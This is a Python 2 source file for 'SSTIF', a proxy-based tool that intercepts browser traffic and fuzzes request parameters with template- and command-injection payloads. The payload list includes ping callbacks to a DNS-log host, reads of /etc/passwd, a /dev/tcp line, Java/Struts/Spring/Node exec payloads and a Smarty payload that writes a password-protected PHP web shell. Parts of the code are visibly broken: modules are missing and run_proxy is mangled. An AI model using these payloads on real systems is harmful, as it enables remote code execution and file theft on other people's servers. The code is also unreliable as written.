#!/usr/bin/env python
# -*- coding:utf-8 -*-

import logging
import os
import re
import sys
import urllib
import socket
from urlparse import urlparse
from Queue import Queue
import threading
import traceback

logger = logging.getLogger('tornado_proxy')
__all__ = ['ProxyHandler', 'run_proxy']
helpinfo = '''\
##########################################################
#   ____   ____   _____   ___  _____                     #
#  / ___| / ___| |_   _| |_ _||  ___|                    #
#  \___ \ \___ \   | |    | | | |_                       #
#   ___) | ___) |  | |    | | |  _|                      #
#  |____/ |____/   |_|   |___||_|       CF_HB@heysec.org #
##########################################################
# 一个Fuzzing服务器端模板注入漏洞的半自动化工具
取名: Server Side Template Injection Tool
简称: SSTIF
参考:
http://dwz.cn/3JHNf2
http://drops.wooyun.org/tips/2494
http://blog.portswigger.net/2015/08/server-side-template-injection.html
使用方法:
    1、python ssitf.py 8081 (开启8081代理端口)
    2、浏览器设置通过8081代理端口，然后像Sqli半自动化工具那样操作。
'''

class SSTIF_Fuzz(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self._version = 1.0
        self.author = "CF_HB"
        self.my_cloudeye = "xxxx.dnslog.info"
        self.CheckKey_list = ['646744516', '/sbin/nologin', '/bin/bash']
        self.fuzzing_payloads_list = []
        self.fuzzing_finished_url = []
        self._init_payloads_()

    # 初始化payloads
    # 出现字符串: 646744516
    def _init_payloads_(self,):
        payloads_list = []
        # 通用
        payloads_list.append("`ping {my_cloudeye}`".replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append("test|ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("test&&ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("test;ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("test%0Aping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("test%26%26ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("test%ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))

        payloads_list.append("`cat</etc/passwd`")
        payloads_list.append("`cat$IFS/etc/passwd`")
        payloads_list.append("`cat$IFS/dev/tcp/Found.linuxRCE.{my_cloudeye}/80/`".replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append('''";/bin/cat</etc/passwd;"''')
        payloads_list.append("10516*61501")
        payloads_list.append("cat</etc/passwd")
        payloads_list.append("{{10516*61501}}")
        payloads_list.append("${10516*61501}")
        payloads_list.append("#{10516*61501}")
        payloads_list.append("${@eval%2810516*61501%29}")
        payloads_list.append('''${@system(ping {my_cloudeye})}'''.replace("{my_cloudeye}", self.my_cloudeye))
        payloads_list.append("#{ping {my_cloudeye}}".replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append("ping {my_cloudeye}".replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append("$(ping {my_cloudeye})".replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append("${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u002710516*61501\u0027).getInputStream())}")
        # PHP
        payloads_list.append("{php}echo 10516*61501;{/php}")
        payloads_list.append("${${eval(10516*61501)}}")
        payloads_list.append("$%7B$%7Beval(10516*61501)%7D%7D")
        payloads_list.append("<?php echo 10516*61501;?>")
        payloads_list.append("<? echo 10516*61501;?>")
        payloads_list.append("<SCRIPT LANGUAGE='php'>echo 10516*61501;</SCRIPT>")
        payloads_list.append("<% echo 10516*61501; %>")
        payloads_list.append("<% import os x=os.popen('ping {my_cloudeye}').read() %> ${x}".replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append('''{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ping {my_cloudeye}")}}'''.replace("{my_cloudeye}",self.my_cloudeye))
        # 写入shell:fuzzingRCE.php 密码：wooyun
        payloads_list.append('''{Smarty_Internal_Write_File::writeFile('fuzzingRCE.php',"<?php passthru($_GET['wooyun']);?>",self::clearConfig())}''')
        # JAVA
        payloads_list.append('''$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping {my_cloudeye}").waitFor()'''.replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append('''<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(ping {my_cloudeye}) }'''.replace("{my_cloudeye}",self.my_cloudeye))
        payloads_list.append('''&('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exec("ping {my_cloudeye}")')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1'''.replace("{my_cloudeye}",self.my_cloudeye))
        # EL表达式
        payloads_list.append('''${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping {my_cloudeye}",null).getInputStream())}'''.replace("{my_cloudeye}",self.my_cloudeye))
        # Spring SPEL表达式POC
        #
        payloads_list.append('''${new%20java.lang.String(new%20byte[]{54, 52, 54, 55, 52, 52, 53, 49, 54})}''')
        # Spring SPEL表达式EXP
        payloads_list.append('''${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat</etc/passwd').getInputStream())}''')
        # Groovy
        payloads_list.append(''' println "ping {my_cloudeye}".execute().text'''.replace("{my_cloudeye}",self.my_cloudeye))
        exp = '''\
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('ping {my_cloudeye}')
'''
        payloads_list.append(exp.replace("{my_cloudeye}",self.my_cloudeye))
        # 初始化paylaods
        self.fuzzing_payloads_list = payloads_list

    # 发出请求
    def HttpHelper(self, requests_dict, data=None):
        isVul = False
        fuzzing_url = requests_dict['uri']
        headers = requests_dict['headers']
        try:
            if "GET" == requests_dict['method']:
                resp = requests.get(fuzzing_url, headers=headers, timeout=10)
                result = resp.content
                for key in self.CheckKey_list:
                    if key in result:
                        isVul = True
                        break
            elif "POST" == requests_dict['method']:
                resp = requests.post(fuzzing_url, data=requests_dict['body'], headers=headers, timeout=10)
                result = resp.content
                for key in self.CheckKey_list:
                    if key in result:
                        isVul = True
                        break
        except:
            isVul = False
        return isVul

    # Fuzzing_GET请求
    def Fuzzing_GET(self, request):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = request['uri']
        if base_url in self.fuzzing_finished_url:
            return
        self.fuzzing_finished_url.append(base_url)
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", base_url):
            # print "* Fuzzing parameter '%s' = '%s'" % (match.group("parameter"), match.group("value"))
            print "[GET] Fuzzing "+match.group("parameter")
            for payload_item in fuzzing_payloads:
                if self.my_cloudeye in payload_item:
                    payload_item = payload_item.replace(self.my_cloudeye,"testmeSSTIF."+self.my_cloudeye)
                fuzzing_url = base_url.replace('%s=%s' % (match.group("parameter"), match.group("value")),'%s=%s' % (match.group("parameter"), payload_item))
                request['uri'] = fuzzing_url
                isVuln = self.HttpHelper(request)
                if isVuln:
                    self.FileHelper("GET", base_url, match.group("parameter"), payload_item)
            print "[+] Fuzzing Done!!"
        return

    # Fuzzing_POST请求
    def Fuzzing_POST(self, request):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = request['uri']
        post_body = request['body']
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", post_body):
            print "[POST] Fuzzing "+match.group("parameter")
            for payload_item in fuzzing_payloads:
                if self.my_cloudeye in payload_item:
                    payload_item = payload_item.replace(self.my_cloudeye,"testmeSSTIF."+self.my_cloudeye)
                fuzzing_post_body = post_body.replace('%s=%s' % (match.group("parameter"), match.group("value")),'%s=%s' % (match.group("parameter"), payload_item))
                request['body'] = fuzzing_post_body
                isVuln = self.HttpHelper(request)
                if isVuln:
                    self.FileHelper("POST", base_url, match.group("parameter"), payload_item)
            print "[+] Fuzzing Done!!"
        return

    def Fuzzing_HEADER(self, request):

        print "Fuzzing HEADER"
        # header暂时不Fuzzing
        # headers_map = request['headers'].get_all()
        # for (k,v) in headers_map:
        #     print "%s - %s" % (k,v)

    # 记录到文件
    def FileHelper(self, HTTP_Method, Rce_URL, parameter, payload):
        wfile = open('rce_success_result.txt', mode='a+')
        found_rce_text = '''\
+==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==+
+=+URL: {RCE_URL}
+=+method: {HTTP_Method}
+=+param: {parameter}
+=+payload: {payload}
+==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==+
        '''
        found_rce_text = found_rce_text.replace("{RCE_URL}", Rce_URL).replace("{HTTP_Method}", HTTP_Method).replace("{parameter}", parameter).replace("{payload}", payload)
        wfile.write(found_rce_text)
        wfile.write("\r\n")
        wfile.flush()
        wfile.close()

    def run(self):
        while True:
            try:
                request = self.queue.get()
                print "[+] Left "+str(self.queue.qsize())
                method = request['method']
                if "POST" in method:
                    self.Fuzzing_POST(request)
                elif "GET" in method:
                    self.Fuzzing_GET(request)
            except Exception,ex:
                traceback.print_exc()
                pass
def get_proxy(url):
    url_parsed = urlparse(url, scheme='http')
    proxy_key = '%s_proxy' % url_parsed.scheme
    return os.environ.get(proxy_key)

def parse_proxy(proxy):
    proxy_parsed = urlparse(proxy, scheme='http')
    return proxy_parsed.hostname, proxy_parsed.port

def fetch_request(url, callback, **kwargs):
    proxy = get_proxy(url)
    if proxy:
        logger.debug('Forward request via upstream proxy %s', proxy)
        tornado.httpclient.AsyncHTTPClient.configure(
            'tornado.curl_httpclient.CurlAsyncHTTPClient')
        host, port = parse_proxy(proxy)
        kwargs['proxy_host'] = host
        kwargs['proxy_port'] = port
    req = tornado.httpclient.HTTPRequest(url, **kwargs)
    client = tornado.httpclient.AsyncHTTPClient()
    client.fetch(req, callback, raise_error=False)

class ProxyHandler:
    SUPPORTED_METHODS = ['GET', 'POST', 'CONNECT']
    url_ext_black = ['ico','flv','css','jpg','png','jpeg','gif','pdf','ss3','txt','rar','zip','avi','mp4','swf','wmi','exe','mpeg']
    domain_black = ['gov.cn','gov.com','mil.cn','police.cn','127.0.0.1','localhost','doubleclick','cnzz.com','baidu.com','40017.cn','google-analytics.com','googlesyndication','gstatic.com','bing.com','google.com','sina.com','weibo.com']
    queue=Queue()
    SSTIF_Fuzz(queue).start()
    def compute_etag(self):
        return None # disable tornado Etag
    def extract_request(self,url,method,headers,body):
        requests="%s %s\r\n"%(method,url)
        for key,value in headers.items():
            requests+="%s: %s\r\n"%(key,value)
        if body:
            requests+="\r\n%s"%body
        #print requests
    def get(self):
        logger.debug('Handle %s request to %s', self.request.method,
                     self.request.uri)

        def handle_response(response):
            if (response.error and not
                    isinstance(response.error, tornado.httpclient.HTTPError)):
                self.set_status(500)
                self.write('Internal server error:\n' + str(response.error))
            else:
                self.set_status(response.code, response.reason)
                self._headers = tornado.httputil.HTTPHeaders() # clear tornado default header
                for header, v in response.headers.get_all():
                    if header not in ('Content-Length', 'Transfer-Encoding', 'Content-Encoding', 'Connection'):
                        self.add_header(header, v) # some header appear multiple times, eg 'Set-Cookie'

                if response.body:
                    self.set_header('Content-Length', len(response.body))
                    self.write(response.body)
            self.finish()
        body = self.request.body
        if not body:
            body = None
        try:
            if 'Proxy-Connection' in self.request.headers:
                del self.request.headers['Proxy-Connection']
            fetch_request(
                self.request.uri, handle_response,
                method=self.request.method, body=body,
                headers=self.request.headers, follow_redirects=False,
                allow_nonstandard_methods=True)
            request_dict = {}
            request_dict['uri'] = self.request.uri
            request_dict['method'] = self.request.method
            request_dict['headers'] = self.request.headers
            request_dict['body'] = body
            url_ext = urlparse(self.request.uri).path[-4:].lower()
            Flag = True
            for url_item in self.url_ext_black:
                if url_item in url_ext :
                    Flag = False
                    break
                if ".js" in url_ext and ".jsp" not in url_ext:
                    Flag = False

            if Flag:
                for domain_item in self.domain_black:
                    if domain_item in self.request.uri:
                        Flag = False
                        break
            if Flag:
                self.queue.put(request_dict)
        except tornado.httpclient.HTTPError as e:
            if hasattr(e, 'response') and e.response:
                handle_response(e.response)
            else:
                self.write(e.response)
                self.set_status(500)
                # self.write('Internal server error:\n' + str(e))
                self.finish()

    def post(self):
        return self.get()

    def connect(self):
        logger.debug('Start CONNECT to %s', self.request.uri)
        host, port = self.request.uri.split(':')
        client = self.request.connection.stream

        def read_from_client(data):
            upstream.write(data)

        def read_from_upstream(data):
            client.write(data)

        def client_close(data=None):
            if upstream.closed():
                return
            if data:
                upstream.write(data)
            upstream.close()

        def upstream_close(data=None):
            if client.closed():
                return
            if data:
                client.write(data)
            client.close()

        def start_tunnel():
            logger.debug('CONNECT tunnel established to %s', self.request.uri)
            client.read_until_close(client_close, read_from_client)
            upstream.read_until_close(upstream_close, read_from_upstream)
            client.write(b'HTTP/1.0 200 Connection established\r\n\r\n')

        def on_proxy_response(data=None):
            if data:
                first_line = data.splitlines()[0]
                http_v, status, text = first_line.split(None, 2)
                if int(status) == 200:
                    logger.debug('Connected to upstream proxy %s', proxy)
                    start_tunnel()
                    return
            self.set_status(500)
            self.finish()

        def start_proxy_tunnel():
            upstream.write('CONNECT %s HTTP/1.1\r\n' % self.request.uri)
            upstream.write('Host: %s\r\n' % self.request.uri)
            upstream.write('Proxy-Connection: Keep-Alive\r\n\r\n')
            upstream.read_until('\r\n\r\n', on_proxy_response)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        upstream = tornado.iostream.IOStream(s)

        proxy = get_proxy(self.request.uri)
        if proxy:
            proxy_host, proxy_port = parse_proxy(proxy)
            upstream.connect((proxy_host, proxy_port), start_proxy_tunnel)
        else:
            upstream.connect((host, int(port)), start_tunnel)

def run_proxy(port, start_ioloop=True):
        (r'.*', ProxyHandler),

app.listen(port)
ioloop = tornado.ioloop.IOLoop.instance()
    if start_ioloop:
    ioloop.start()

if __name__ == '__main__':
    print helpinfo
    port = 8081
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    print ("Starting HTTP proxy on port %d" % port)
    run_proxy(port)
